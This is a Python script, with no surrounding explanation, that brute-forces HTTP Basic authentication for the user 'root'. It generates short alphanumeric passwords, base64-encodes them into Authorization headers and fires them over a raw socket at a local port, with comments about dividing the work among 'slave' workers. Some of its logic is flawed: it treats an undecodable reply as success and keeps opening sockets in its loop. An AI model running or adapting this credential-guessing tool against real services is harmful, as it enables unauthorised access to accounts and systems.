import time
import socket
import base64
import string
from sys import path

def getPswds(charlist, increment, max_size, ID: int = 0, pswds: str = []):
    if(max_size == 0):                                                                     
        return [pswds[i] for i in range(ID,len(pswds),increment)]                           
    if(len(pswds) == 0):                                                                    
        pswds = [pswd for pswd in charlist]                                                 
    else:                                                                                   
        if(len(pswds) == len(charlist)):                                                    
            pswds.extend([i + pswd for i in charlist for pswd in pswds])                    
        else:                                                                               
            pswds.extend([i + pswd for i in charlist for pswd in pswds[:-len(charlist)]])   
    return getPswds(charlist, increment, max_size - 1, ID, pswds)         


host = '0.0.0.0'
port = 8000
username = 'root'
tries = []

done = False
while not done:
    done = False
    offset = 1              # Number of Slave                                                                            
    ID = 0                  # Id of slave                                         
    Max_size = 2            # Max word size
    chars = string.ascii_letters + string.digits
    pswds = getPswds(chars, offset, Max_size, ID)
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((host, port))
    for pswd in pswds[:2*len(chars)]:
        token = '{}:{}'.format(username, pswd)
        token = token.encode('ascii')
        token = base64.b64encode(token)
        token = token.decode('ascii')
        
        lines = [
            'GET / HTTP/1.1',
            'Host: {}'.format(host),
            'Authorization: Basic {}'.format(token),
            'Connection: keep-alive'
        ]
        request = '\r\n'.join(lines)+'\r\n\r\n'
        s.send(request.encode('utf-8'))
        time.sleep(1)
        result = s.recv(1024)
        try:
            result = result.decode('utf-8')
        except:
            print("its good")
            done = True
            break
    
s.close()                  